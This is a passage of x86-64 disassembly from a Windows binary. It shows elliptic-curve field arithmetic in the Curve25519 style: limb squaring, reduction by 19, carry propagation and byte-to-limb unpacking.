   1400029bd:	49 8b c0             	mov    %r8,%rax
   1400029c0:	49 0f af c0          	imul   %r8,%rax
   1400029c4:	49 63 5f 18          	movslq 0x18(%r15),%rbx
   1400029c8:	49 8b d2             	mov    %r10,%rdx
   1400029cb:	48 89 01             	mov    %rax,(%rcx)
   1400029ce:	49 8b c2             	mov    %r10,%rax
   1400029d1:	49 63 6f 20          	movslq 0x20(%r15),%rbp
   1400029d5:	4d 63 77 28          	movslq 0x28(%r15),%r14
   1400029d9:	49 63 77 30          	movslq 0x30(%r15),%rsi
   1400029dd:	4d 63 5f 38          	movslq 0x38(%r15),%r11
   1400029e1:	49 0f af c0          	imul   %r8,%rax
   1400029e5:	49 0f af d2          	imul   %r10,%rdx
   1400029e9:	48 03 c0             	add    %rax,%rax
   1400029ec:	4d 63 4f 40          	movslq 0x40(%r15),%r9
   1400029f0:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400029f4:	48 8b c7             	mov    %rdi,%rax
   1400029f7:	49 0f af c0          	imul   %r8,%rax
   1400029fb:	48 03 d0             	add    %rax,%rdx
   1400029fe:	48 8b c3             	mov    %rbx,%rax
   140002a01:	49 0f af c0          	imul   %r8,%rax
   140002a05:	48 03 d2             	add    %rdx,%rdx
   140002a08:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140002a0c:	48 8b cf             	mov    %rdi,%rcx
   140002a0f:	49 0f af ca          	imul   %r10,%rcx
   140002a13:	48 03 c8             	add    %rax,%rcx
   140002a16:	48 8b c5             	mov    %rbp,%rax
   140002a19:	48 03 c9             	add    %rcx,%rcx
   140002a1c:	49 89 4d 18          	mov    %rcx,0x18(%r13)
   140002a20:	48 8b cb             	mov    %rbx,%rcx
   140002a23:	49 0f af c0          	imul   %r8,%rax
   140002a27:	49 0f af ca          	imul   %r10,%rcx
   140002a2b:	48 8d 0c 48          	lea    (%rax,%rcx,2),%rcx
   140002a2f:	48 8b c7             	mov    %rdi,%rax
   140002a32:	48 0f af c7          	imul   %rdi,%rax
   140002a36:	48 8d 04 48          	lea    (%rax,%rcx,2),%rax
   140002a3a:	48 8b cb             	mov    %rbx,%rcx
   140002a3d:	49 89 45 20          	mov    %rax,0x20(%r13)
   140002a41:	49 8b c6             	mov    %r14,%rax
   140002a44:	48 0f af cf          	imul   %rdi,%rcx
   140002a48:	49 0f af c0          	imul   %r8,%rax
   140002a4c:	48 03 c8             	add    %rax,%rcx
   140002a4f:	48 8b c5             	mov    %rbp,%rax
   140002a52:	49 0f af c2          	imul   %r10,%rax
   140002a56:	48 03 c8             	add    %rax,%rcx
   140002a59:	48 8b c5             	mov    %rbp,%rax
   140002a5c:	48 03 c9             	add    %rcx,%rcx
   140002a5f:	49 89 4d 28          	mov    %rcx,0x28(%r13)
   140002a63:	48 8b cb             	mov    %rbx,%rcx
   140002a66:	48 0f af cb          	imul   %rbx,%rcx
   140002a6a:	48 0f af c7          	imul   %rdi,%rax
   140002a6e:	48 03 c8             	add    %rax,%rcx
   140002a71:	48 8b c6             	mov    %rsi,%rax
   140002a74:	49 0f af c0          	imul   %r8,%rax
   140002a78:	48 03 c8             	add    %rax,%rcx
   140002a7b:	49 8b c6             	mov    %r14,%rax
   140002a7e:	49 0f af c2          	imul   %r10,%rax
   140002a82:	48 8d 0c 41          	lea    (%rcx,%rax,2),%rcx
   140002a86:	49 8b c6             	mov    %r14,%rax
   140002a89:	48 03 c9             	add    %rcx,%rcx
   140002a8c:	49 89 4d 30          	mov    %rcx,0x30(%r13)
   140002a90:	48 8b cd             	mov    %rbp,%rcx
   140002a93:	48 0f af cb          	imul   %rbx,%rcx
   140002a97:	48 0f af c7          	imul   %rdi,%rax
   140002a9b:	48 03 c8             	add    %rax,%rcx
   140002a9e:	49 8b c3             	mov    %r11,%rax
   140002aa1:	49 0f af c0          	imul   %r8,%rax
   140002aa5:	48 03 c8             	add    %rax,%rcx
   140002aa8:	48 8b c6             	mov    %rsi,%rax
   140002aab:	49 0f af c2          	imul   %r10,%rax
   140002aaf:	48 03 c8             	add    %rax,%rcx
   140002ab2:	49 8b c3             	mov    %r11,%rax
   140002ab5:	48 03 c9             	add    %rcx,%rcx
   140002ab8:	49 89 4d 38          	mov    %rcx,0x38(%r13)
   140002abc:	49 8b ce             	mov    %r14,%rcx
   140002abf:	48 0f af cb          	imul   %rbx,%rcx
   140002ac3:	49 0f af c2          	imul   %r10,%rax
   140002ac7:	48 03 c8             	add    %rax,%rcx
   140002aca:	4d 63 67 48          	movslq 0x48(%r15),%r12
   140002ace:	48 8b c6             	mov    %rsi,%rax
   140002ad1:	48 0f af c7          	imul   %rdi,%rax
   140002ad5:	48 8d 0c 48          	lea    (%rax,%rcx,2),%rcx
   140002ad9:	49 8b c1             	mov    %r9,%rax
   140002adc:	49 0f af c0          	imul   %r8,%rax
   140002ae0:	4d 0f af c4          	imul   %r12,%r8
   140002ae4:	48 03 c8             	add    %rax,%rcx
   140002ae7:	48 8b c5             	mov    %rbp,%rax
   140002aea:	48 0f af c5          	imul   %rbp,%rax
   140002aee:	48 8d 04 48          	lea    (%rax,%rcx,2),%rax
   140002af2:	49 8b ce             	mov    %r14,%rcx
   140002af5:	48 0f af cd          	imul   %rbp,%rcx
   140002af9:	49 89 45 40          	mov    %rax,0x40(%r13)
   140002afd:	48 8b c6             	mov    %rsi,%rax
   140002b00:	48 0f af c3          	imul   %rbx,%rax
   140002b04:	48 03 c8             	add    %rax,%rcx
   140002b07:	49 8b c3             	mov    %r11,%rax
   140002b0a:	48 0f af c7          	imul   %rdi,%rax
   140002b0e:	48 03 c8             	add    %rax,%rcx
   140002b11:	49 8b c1             	mov    %r9,%rax
   140002b14:	49 0f af c2          	imul   %r10,%rax
   140002b18:	4d 0f af d4          	imul   %r12,%r10
   140002b1c:	48 03 c8             	add    %rax,%rcx
   140002b1f:	49 8b c6             	mov    %r14,%rax
   140002b22:	49 03 c8             	add    %r8,%rcx
   140002b25:	48 03 c9             	add    %rcx,%rcx
   140002b28:	49 89 4d 48          	mov    %rcx,0x48(%r13)
   140002b2c:	49 8b cb             	mov    %r11,%rcx
   140002b2f:	48 0f af cb          	imul   %rbx,%rcx
   140002b33:	49 0f af c6          	imul   %r14,%rax
   140002b37:	49 03 ca             	add    %r10,%rcx
   140002b3a:	48 8d 14 48          	lea    (%rax,%rcx,2),%rdx
   140002b3e:	48 8b c6             	mov    %rsi,%rax
   140002b41:	48 0f af c5          	imul   %rbp,%rax
   140002b45:	48 8b ce             	mov    %rsi,%rcx
   140002b48:	48 03 d0             	add    %rax,%rdx
   140002b4b:	49 8b c1             	mov    %r9,%rax
   140002b4e:	48 0f af c7          	imul   %rdi,%rax
   140002b52:	49 0f af ce          	imul   %r14,%rcx
   140002b56:	49 0f af fc          	imul   %r12,%rdi
   140002b5a:	48 03 d0             	add    %rax,%rdx
   140002b5d:	49 8b c3             	mov    %r11,%rax
   140002b60:	48 0f af c5          	imul   %rbp,%rax
   140002b64:	48 03 d2             	add    %rdx,%rdx
   140002b67:	48 03 c8             	add    %rax,%rcx
   140002b6a:	49 89 55 50          	mov    %rdx,0x50(%r13)
   140002b6e:	49 8b c1             	mov    %r9,%rax
   140002b71:	48 0f af c3          	imul   %rbx,%rax
   140002b75:	49 0f af dc          	imul   %r12,%rbx
   140002b79:	48 03 c8             	add    %rax,%rcx
   140002b7c:	49 8b c1             	mov    %r9,%rax
   140002b7f:	48 03 cf             	add    %rdi,%rcx
   140002b82:	48 03 c9             	add    %rcx,%rcx
   140002b85:	49 89 4d 58          	mov    %rcx,0x58(%r13)
   140002b89:	49 8b cb             	mov    %r11,%rcx
   140002b8c:	49 0f af ce          	imul   %r14,%rcx
   140002b90:	48 0f af c5          	imul   %rbp,%rax
   140002b94:	49 0f af ec          	imul   %r12,%rbp
   140002b98:	48 03 cb             	add    %rbx,%rcx
   140002b9b:	48 8d 0c 48          	lea    (%rax,%rcx,2),%rcx
   140002b9f:	48 8b c6             	mov    %rsi,%rax
   140002ba2:	48 0f af c6          	imul   %rsi,%rax
   140002ba6:	48 8d 04 48          	lea    (%rax,%rcx,2),%rax
   140002baa:	49 8b cb             	mov    %r11,%rcx
   140002bad:	48 0f af ce          	imul   %rsi,%rcx
   140002bb1:	49 89 45 60          	mov    %rax,0x60(%r13)
   140002bb5:	49 8b c1             	mov    %r9,%rax
   140002bb8:	49 0f af c6          	imul   %r14,%rax
   140002bbc:	48 03 c8             	add    %rax,%rcx
   140002bbf:	49 8b c1             	mov    %r9,%rax
   140002bc2:	48 03 cd             	add    %rbp,%rcx
   140002bc5:	48 03 c9             	add    %rcx,%rcx
   140002bc8:	49 89 4d 68          	mov    %rcx,0x68(%r13)
   140002bcc:	49 8b cb             	mov    %r11,%rcx
   140002bcf:	48 0f af c6          	imul   %rsi,%rax
   140002bd3:	49 0f af cb          	imul   %r11,%rcx
   140002bd7:	48 03 c8             	add    %rax,%rcx
   140002bda:	4d 0f af f4          	imul   %r12,%r14
   140002bde:	4a 8d 04 71          	lea    (%rcx,%r14,2),%rax
   140002be2:	48 03 c0             	add    %rax,%rax
   140002be5:	33 c9                	xor    %ecx,%ecx
   140002be7:	49 89 45 70          	mov    %rax,0x70(%r13)
   140002beb:	49 8b c1             	mov    %r9,%rax
   140002bee:	49 0f af c3          	imul   %r11,%rax
   140002bf2:	49 0f af f4          	imul   %r12,%rsi
   140002bf6:	4d 0f af c9          	imul   %r9,%r9
   140002bfa:	4d 0f af dc          	imul   %r12,%r11
   140002bfe:	48 03 c6             	add    %rsi,%rax
   140002c01:	48 03 c0             	add    %rax,%rax
   140002c04:	83 3d 6d 84 00 00 06 	cmpl   $0x6,0x846d(%rip)        # 0x14000b078
   140002c0b:	49 89 45 78          	mov    %rax,0x78(%r13)
   140002c0f:	4b 8d 04 99          	lea    (%r9,%r11,4),%rax
   140002c13:	49 89 85 80 00 00 00 	mov    %rax,0x80(%r13)
   140002c1a:	7c 39                	jl     0x140002c55
   140002c1c:	f3 41 0f 6f 47 40    	movdqu 0x40(%r15),%xmm0
   140002c22:	66 0f 38 00 05 25 f0 	pshufb -0xfdb(%rip),%xmm0        # 0x140001c50
   140002c29:	ff ff 
   140002c2b:	66 0f 38 25 c8       	pmovsxdq %xmm0,%xmm1
   140002c30:	66 41 0f 6e 47 48    	movd   0x48(%r15),%xmm0
   140002c36:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   140002c3b:	66 0f 38 25 c0       	pmovsxdq %xmm0,%xmm0
   140002c40:	62 f2 fd 08 40 d1    	vpmullq %xmm1,%xmm0,%xmm2
   140002c46:	66 0f d4 d2          	paddq  %xmm2,%xmm2
   140002c4a:	f3 41 0f 7f 95 88 00 	movdqu %xmm2,0x88(%r13)
   140002c51:	00 00 
   140002c53:	eb 35                	jmp    0x140002c8a
   140002c55:	48 8d 04 cd 88 00 00 	lea    0x88(,%rcx,8),%rax
   140002c5c:	00 
   140002c5d:	4d 2b fd             	sub    %r13,%r15
   140002c60:	49 03 c5             	add    %r13,%rax
   140002c63:	ba 02 00 00 00       	mov    $0x2,%edx
   140002c68:	48 2b d1             	sub    %rcx,%rdx
   140002c6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c70:	4a 63 4c 38 b8       	movslq -0x48(%rax,%r15,1),%rcx
   140002c75:	48 8d 40 08          	lea    0x8(%rax),%rax
   140002c79:	49 0f af cc          	imul   %r12,%rcx
   140002c7d:	48 03 c9             	add    %rcx,%rcx
   140002c80:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140002c84:	48 83 ea 01          	sub    $0x1,%rdx
   140002c88:	75 e6                	jne    0x140002c70
   140002c8a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140002c8f:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140002c94:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002c99:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140002c9e:	41 5f                	pop    %r15
   140002ca0:	41 5e                	pop    %r14
   140002ca2:	41 5d                	pop    %r13
   140002ca4:	41 5c                	pop    %r12
   140002ca6:	c3                   	ret
   140002ca7:	cc                   	int3
   140002ca8:	cc                   	int3
   140002ca9:	cc                   	int3
   140002caa:	cc                   	int3
   140002cab:	cc                   	int3
   140002cac:	cc                   	int3
   140002cad:	cc                   	int3
   140002cae:	cc                   	int3
   140002caf:	cc                   	int3
   140002cb0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002cb5:	55                   	push   %rbp
   140002cb6:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140002cbb:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   140002cc2:	48 8b 05 37 83 00 00 	mov    0x8337(%rip),%rax        # 0x14000b000
   140002cc9:	48 33 c4             	xor    %rsp,%rax
   140002ccc:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140002cd0:	48 8b d9             	mov    %rcx,%rbx
   140002cd3:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140002cd7:	e8 b4 fc ff ff       	call   0x140002990
   140002cdc:	48 6b 45 37 13       	imul   $0x13,0x37(%rbp),%rax
   140002ce1:	4c 8d 45 b7          	lea    -0x49(%rbp),%r8
   140002ce5:	41 b9 05 00 00 00    	mov    $0x5,%r9d
   140002ceb:	48 01 45 e7          	add    %rax,-0x19(%rbp)
   140002cef:	48 6b 45 2f 13       	imul   $0x13,0x2f(%rbp),%rax
   140002cf4:	48 01 45 df          	add    %rax,-0x21(%rbp)
   140002cf8:	48 6b 45 27 13       	imul   $0x13,0x27(%rbp),%rax
   140002cfd:	48 01 45 d7          	add    %rax,-0x29(%rbp)
   140002d01:	48 6b 45 1f 13       	imul   $0x13,0x1f(%rbp),%rax
   140002d06:	48 01 45 cf          	add    %rax,-0x31(%rbp)
   140002d0a:	48 6b 45 17 13       	imul   $0x13,0x17(%rbp),%rax
   140002d0f:	48 01 45 c7          	add    %rax,-0x39(%rbp)
   140002d13:	48 6b 45 0f 13       	imul   $0x13,0xf(%rbp),%rax
   140002d18:	48 01 45 bf          	add    %rax,-0x41(%rbp)
   140002d1c:	48 6b 45 07 13       	imul   $0x13,0x7(%rbp),%rax
   140002d21:	48 01 45 b7          	add    %rax,-0x49(%rbp)
   140002d25:	48 6b 45 ff 13       	imul   $0x13,-0x1(%rbp),%rax
   140002d2a:	48 01 45 af          	add    %rax,-0x51(%rbp)
   140002d2e:	48 6b 45 f7 13       	imul   $0x13,-0x9(%rbp),%rax
   140002d33:	48 01 45 a7          	add    %rax,-0x59(%rbp)
   140002d37:	45 33 d2             	xor    %r10d,%r10d
   140002d3a:	4c 89 55 f7          	mov    %r10,-0x9(%rbp)
   140002d3e:	66 90                	xchg   %ax,%ax
   140002d40:	49 8b 50 f0          	mov    -0x10(%r8),%rdx
   140002d44:	4d 8d 40 10          	lea    0x10(%r8),%r8
   140002d48:	48 8b ca             	mov    %rdx,%rcx
   140002d4b:	48 c1 e9 20          	shr    $0x20,%rcx
   140002d4f:	c1 f9 1f             	sar    $0x1f,%ecx
   140002d52:	48 c1 e9 06          	shr    $0x6,%rcx
   140002d56:	48 03 ca             	add    %rdx,%rcx
   140002d59:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140002d5d:	48 8b c1             	mov    %rcx,%rax
   140002d60:	48 c1 e0 1a          	shl    $0x1a,%rax
   140002d64:	48 2b d0             	sub    %rax,%rdx
   140002d67:	49 89 50 e0          	mov    %rdx,-0x20(%r8)
   140002d6b:	49 8b 50 e8          	mov    -0x18(%r8),%rdx
   140002d6f:	48 03 d1             	add    %rcx,%rdx
   140002d72:	48 8b ca             	mov    %rdx,%rcx
   140002d75:	48 c1 e9 20          	shr    $0x20,%rcx
   140002d79:	c1 f9 1f             	sar    $0x1f,%ecx
   140002d7c:	48 c1 e9 07          	shr    $0x7,%rcx
   140002d80:	48 03 ca             	add    %rdx,%rcx
   140002d83:	48 c1 f9 19          	sar    $0x19,%rcx
   140002d87:	49 01 48 f0          	add    %rcx,-0x10(%r8)
   140002d8b:	48 8b c1             	mov    %rcx,%rax
   140002d8e:	48 c1 e0 19          	shl    $0x19,%rax
   140002d92:	48 2b d0             	sub    %rax,%rdx
   140002d95:	49 89 50 e8          	mov    %rdx,-0x18(%r8)
   140002d99:	49 83 e9 01          	sub    $0x1,%r9
   140002d9d:	75 a1                	jne    0x140002d40
   140002d9f:	48 6b 55 f7 13       	imul   $0x13,-0x9(%rbp),%rdx
   140002da4:	44 89 55 97          	mov    %r10d,-0x69(%rbp)
   140002da8:	48 03 55 a7          	add    -0x59(%rbp),%rdx
   140002dac:	48 8b ca             	mov    %rdx,%rcx
   140002daf:	4c 89 55 f7          	mov    %r10,-0x9(%rbp)
   140002db3:	48 c1 e9 20          	shr    $0x20,%rcx
   140002db7:	c1 f9 1f             	sar    $0x1f,%ecx
   140002dba:	48 c1 e9 06          	shr    $0x6,%rcx
   140002dbe:	48 03 ca             	add    %rdx,%rcx
   140002dc1:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140002dc5:	48 8b c1             	mov    %rcx,%rax
   140002dc8:	48 c1 e0 1a          	shl    $0x1a,%rax
   140002dcc:	48 2b d0             	sub    %rax,%rdx
   140002dcf:	8b 45 97             	mov    -0x69(%rbp),%eax
   140002dd2:	48 01 4d af          	add    %rcx,-0x51(%rbp)
   140002dd6:	48 89 55 a7          	mov    %rdx,-0x59(%rbp)
   140002dda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002de0:	48 63 45 97          	movslq -0x69(%rbp),%rax
   140002de4:	48 8d 55 a7          	lea    -0x59(%rbp),%rdx
   140002de8:	48 63 4d 97          	movslq -0x69(%rbp),%rcx
   140002dec:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
   140002df0:	88 04 19             	mov    %al,(%rcx,%rbx,1)
   140002df3:	8b 45 97             	mov    -0x69(%rbp),%eax
   140002df6:	ff c0                	inc    %eax
   140002df8:	89 45 97             	mov    %eax,-0x69(%rbp)
   140002dfb:	8b 45 97             	mov    -0x69(%rbp),%eax
   140002dfe:	83 f8 50             	cmp    $0x50,%eax
   140002e01:	72 dd                	jb     0x140002de0
   140002e03:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140002e07:	48 33 cc             	xor    %rsp,%rcx
   140002e0a:	e8 d1 6b 00 00       	call   0x1400099e0
   140002e0f:	48 8b 9c 24 00 01 00 	mov    0x100(%rsp),%rbx
   140002e16:	00 
   140002e17:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   140002e1e:	5d                   	pop    %rbp
   140002e1f:	c3                   	ret
   140002e20:	4c 8b d9             	mov    %rcx,%r11
   140002e23:	44 0f b6 4a 03       	movzbl 0x3(%rdx),%r9d
   140002e28:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   140002e2d:	4c 8b d2             	mov    %rdx,%r10
   140002e30:	41 8b c1             	mov    %r9d,%eax
   140002e33:	49 c1 e9 02          	shr    $0x2,%r9
   140002e37:	48 c1 e0 08          	shl    $0x8,%rax
   140002e3b:	4c 0b c0             	or     %rax,%r8
   140002e3e:	0f b6 02             	movzbl (%rdx),%eax
   140002e41:	49 c1 e0 10          	shl    $0x10,%r8
   140002e45:	4c 0b c0             	or     %rax,%r8
   140002e48:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140002e4c:	0f b6 52 06          	movzbl 0x6(%rdx),%edx
   140002e50:	41 81 e0 ff ff ff 03 	and    $0x3ffffff,%r8d
   140002e57:	48 c1 e0 08          	shl    $0x8,%rax
   140002e5b:	4c 0b c0             	or     %rax,%r8
   140002e5e:	41 0f b6 42 05       	movzbl 0x5(%r10),%eax
   140002e63:	4c 89 01             	mov    %r8,(%rcx)
   140002e66:	8b ca                	mov    %edx,%ecx
   140002e68:	83 e1 07             	and    $0x7,%ecx
   140002e6b:	45 0f b6 42 09       	movzbl 0x9(%r10),%r8d
   140002e70:	48 c1 e1 08          	shl    $0x8,%rcx
   140002e74:	48 0b c8             	or     %rax,%rcx
   140002e77:	48 c1 ea 03          	shr    $0x3,%rdx
   140002e7b:	48 c1 e1 08          	shl    $0x8,%rcx
   140002e7f:	41 0f b6 42 04       	movzbl 0x4(%r10),%eax
   140002e84:	48 0b c8             	or     %rax,%rcx
   140002e87:	41 0f b6 42 08       	movzbl 0x8(%r10),%eax
   140002e8c:	48 c1 e1 06          	shl    $0x6,%rcx
   140002e90:	49 0b c9             	or     %r9,%rcx
   140002e93:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140002e97:	41 8b c8             	mov    %r8d,%ecx
   140002e9a:	83 e1 1f             	and    $0x1f,%ecx
   140002e9d:	49 c1 e8 05          	shr    $0x5,%r8
   140002ea1:	48 c1 e1 08          	shl    $0x8,%rcx
   140002ea5:	48 0b c8             	or     %rax,%rcx
   140002ea8:	41 0f b6 42 07       	movzbl 0x7(%r10),%eax
   140002ead:	48 c1 e1 08          	shl    $0x8,%rcx
   140002eb1:	48 0b c8             	or     %rax,%rcx
   140002eb4:	41 0f b6 42 0b       	movzbl 0xb(%r10),%eax
   140002eb9:	48 c1 e1 05          	shl    $0x5,%rcx
   140002ebd:	48 0b ca             	or     %rdx,%rcx
   140002ec0:	41 0f b6 52 0c       	movzbl 0xc(%r10),%edx
   140002ec5:	49 89 4b 10          	mov    %rcx,0x10(%r11)
   140002ec9:	8b ca                	mov    %edx,%ecx
   140002ecb:	83 e1 3f             	and    $0x3f,%ecx
   140002ece:	48 c1 ea 06          	shr    $0x6,%rdx
   140002ed2:	48 c1 e1 08          	shl    $0x8,%rcx
   140002ed6:	48 0b c8             	or     %rax,%rcx
   140002ed9:	41 0f b6 42 0a       	movzbl 0xa(%r10),%eax
   140002ede:	48 c1 e1 08          	shl    $0x8,%rcx
   140002ee2:	48 0b c8             	or     %rax,%rcx
   140002ee5:	41 0f b6 42 0e       	movzbl 0xe(%r10),%eax
   140002eea:	48 c1 e1 03          	shl    $0x3,%rcx
   140002eee:	49 0b c8             	or     %r8,%rcx
   140002ef1:	45 0f b6 42 16       	movzbl 0x16(%r10),%r8d
   140002ef6:	49 89 4b 18          	mov    %rcx,0x18(%r11)
   140002efa:	41 0f b6 4a 0f       	movzbl 0xf(%r10),%ecx
   140002eff:	48 c1 e1 08          	shl    $0x8,%rcx
   140002f03:	48 0b c8             	or     %rax,%rcx
   140002f06:	41 0f b6 42 0d       	movzbl 0xd(%r10),%eax
   140002f0b:	48 c1 e1 08          	shl    $0x8,%rcx
   140002f0f:	48 0b c8             	or     %rax,%rcx
   140002f12:	48 c1 e1 02          	shl    $0x2,%rcx
   140002f16:	48 0b ca             	or     %rdx,%rcx
   140002f19:	41 0f b6 52 13       	movzbl 0x13(%r10),%edx
   140002f1e:	49 89 4b 20          	mov    %rcx,0x20(%r11)
   140002f22:	8b c2                	mov    %edx,%eax
   140002f24:	41 0f b6 4a 12       	movzbl 0x12(%r10),%ecx
   140002f29:	48 c1 e0 08          	shl    $0x8,%rax
   140002f2d:	48 0b c8             	or     %rax,%rcx
   140002f30:	41 0f b6 42 10       	movzbl 0x10(%r10),%eax
   140002f35:	48 c1 e1 10          	shl    $0x10,%rcx
   140002f39:	48 0b c8             	or     %rax,%rcx
   140002f3c:	41 0f b6 42 11       	movzbl 0x11(%r10),%eax
   140002f41:	81 e1 ff ff ff 01    	and    $0x1ffffff,%ecx
   140002f47:	48 c1 e0 08          	shl    $0x8,%rax
   140002f4b:	48 0b c8             	or     %rax,%rcx
   140002f4e:	49 89 4b 28          	mov    %rcx,0x28(%r11)
   140002f52:	41 8b c8             	mov    %r8d,%ecx
   140002f55:	83 e1 07             	and    $0x7,%ecx
   140002f58:	41 0f b6 42 15       	movzbl 0x15(%r10),%eax
   140002f5d:	45 0f b6 4a 19       	movzbl 0x19(%r10),%r9d
   140002f62:	48 c1 e1 08          	shl    $0x8,%rcx
   140002f66:	48 0b c8             	or     %rax,%rcx
   140002f69:	48 d1 ea             	shr    $1,%rdx
   140002f6c:	41 0f b6 42 14       	movzbl 0x14(%r10),%eax
   140002f71:	48 c1 e1 08          	shl    $0x8,%rcx
   140002f75:	48 0b c8             	or     %rax,%rcx
   140002f78:	49 c1 e8 03          	shr    $0x3,%r8
   140002f7c:	41 0f b6 42 18       	movzbl 0x18(%r10),%eax
   140002f81:	48 c1 e1 07          	shl    $0x7,%rcx
   140002f85:	48 0b ca             	or     %rdx,%rcx
   140002f88:	41 0f b6 52 1c       	movzbl 0x1c(%r10),%edx
   140002f8d:	49 89 4b 30          	mov    %rcx,0x30(%r11)
   140002f91:	41 8b c9             	mov    %r9d,%ecx
   140002f94:	83 e1 0f             	and    $0xf,%ecx
   140002f97:	49 c1 e9 04          	shr    $0x4,%r9
   140002f9b:	48 c1 e1 08          	shl    $0x8,%rcx
   140002f9f:	48 0b c8             	or     %rax,%rcx
   140002fa2:	41 0f b6 42 17       	movzbl 0x17(%r10),%eax
   140002fa7:	48 c1 e1 08          	shl    $0x8,%rcx
   140002fab:	48 0b c8             	or     %rax,%rcx
   140002fae:	41 0f b6 42 1b       	movzbl 0x1b(%r10),%eax
   140002fb3:	48 c1 e1 05          	shl    $0x5,%rcx
   140002fb7:	49 0b c8             	or     %r8,%rcx
   140002fba:	49 89 4b 38          	mov    %rcx,0x38(%r11)
   140002fbe:	8b ca                	mov    %edx,%ecx
   140002fc0:	83 e1 3f             	and    $0x3f,%ecx
   140002fc3:	48 c1 ea 06          	shr    $0x6,%rdx
   140002fc7:	48 c1 e1 08          	shl    $0x8,%rcx
   140002fcb:	48 0b c8             	or     %rax,%rcx
   140002fce:	41 0f b6 42 1a       	movzbl 0x1a(%r10),%eax
   140002fd3:	48 c1 e1 08          	shl    $0x8,%rcx
   140002fd7:	48 0b c8             	or     %rax,%rcx
   140002fda:	41 0f b6 42 1e       	movzbl 0x1e(%r10),%eax
   140002fdf:	48 c1 e1 04          	shl    $0x4,%rcx
   140002fe3:	49 0b c9             	or     %r9,%rcx
   140002fe6:	49 89 4b 40          	mov    %rcx,0x40(%r11)
   140002fea:	41 0f b6 4a 1f       	movzbl 0x1f(%r10),%ecx
   140002fef:	83 e1 7f             	and    $0x7f,%ecx
   140002ff2:	48 c1 e1 08          	shl    $0x8,%rcx
   140002ff6:	48 0b c8             	or     %rax,%rcx
   140002ff9:	41 0f b6 42 1d       	movzbl 0x1d(%r10),%eax
   140002ffe:	48 c1 e1 08          	shl    $0x8,%rcx
   140003002:	48 0b c8             	or     %rax,%rcx
   140003005:	48 c1 e1 02          	shl    $0x2,%rcx
   140003009:	48 0b ca             	or     %rdx,%rcx
   14000300c:	49 89 4b 48          	mov    %rcx,0x48(%r11)
   140003010:	c3                   	ret
   140003011:	cc                   	int3
   140003012:	cc                   	int3
   140003013:	cc                   	int3
   140003014:	cc                   	int3
   140003015:	cc                   	int3
   140003016:	cc                   	int3
   140003017:	cc                   	int3
   140003018:	cc                   	int3
   140003019:	cc                   	int3
   14000301a:	cc                   	int3
   14000301b:	cc                   	int3
   14000301c:	cc                   	int3
   14000301d:	cc                   	int3
   14000301e:	cc                   	int3
   14000301f:	cc                   	int3
   140003020:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003025:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000302a:	55                   	push   %rbp
   14000302b:	56                   	push   %rsi
   14000302c:	57                   	push   %rdi
   14000302d:	41 54                	push   %r12
   14000302f:	41 55                	push   %r13
   140003031:	41 56                	push   %r14
   140003033:	41 57                	push   %r15
   140003035:	48 83 ec 30          	sub    $0x30,%rsp
   140003039:	44 8b 12             	mov    (%rdx),%r10d
   14000303c:	41 bb 02 00 00 00    	mov    $0x2,%r11d
   140003042:	8b 72 10             	mov    0x10(%rdx),%esi
   140003045:	45 8b c3             	mov    %r11d,%r8d
   140003048:	8b 6a 18             	mov    0x18(%rdx),%ebp
   14000304b:	41 8b c2             	mov    %r10d,%eax
   14000304e:	44 8b 6a 20          	mov    0x20(%rdx),%r13d
   140003052:	44 8b 4a 28          	mov    0x28(%rdx),%r9d
   140003056:	44 8b 72 30          	mov    0x30(%rdx),%r14d
   14000305a:	44 8b 7a 38          	mov    0x38(%rdx),%r15d
   14000305e:	44 8b 62 40          	mov    0x40(%rdx),%r12d
   140003062:	8b 7a 48             	mov    0x48(%rdx),%edi
   140003065:	8b 5a 08             	mov    0x8(%rdx),%ebx
   140003068:	4c 89 9c 24 80 00 00 	mov    %r11,0x80(%rsp)
   14000306f:	00 
   140003070:	45 8b da             	mov    %r10d,%r11d
   140003073:	0f 1f 40 00          	nopl   0x0(%rax)
   140003077:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000307e:	00 00 
   140003080:	c1 f8 1a             	sar    $0x1a,%eax
   140003083:	41 c1 fa 1f          	sar    $0x1f,%r10d
   140003087:	44 23 d0             	and    %eax,%r10d
   14000308a:	41 03 da             	add    %r10d,%ebx
   14000308d:	8b cb                	mov    %ebx,%ecx
   14000308f:	8b c3                	mov    %ebx,%eax
   140003091:	c1 f8 19             	sar    $0x19,%eax
   140003094:	c1 f9 1f             	sar    $0x1f,%ecx
   140003097:	23 c8                	and    %eax,%ecx
   140003099:	03 f1                	add    %ecx,%esi
   14000309b:	8b c1                	mov    %ecx,%eax
   14000309d:	c1 e0 19             	shl    $0x19,%eax
   1400030a0:	8b ce                	mov    %esi,%ecx
   1400030a2:	2b d8                	sub    %eax,%ebx
   1400030a4:	c1 f9 1f             	sar    $0x1f,%ecx
   1400030a7:	8b c6                	mov    %esi,%eax
   1400030a9:	c1 f8 1a             	sar    $0x1a,%eax
   1400030ac:	23 c8                	and    %eax,%ecx
   1400030ae:	03 e9                	add    %ecx,%ebp
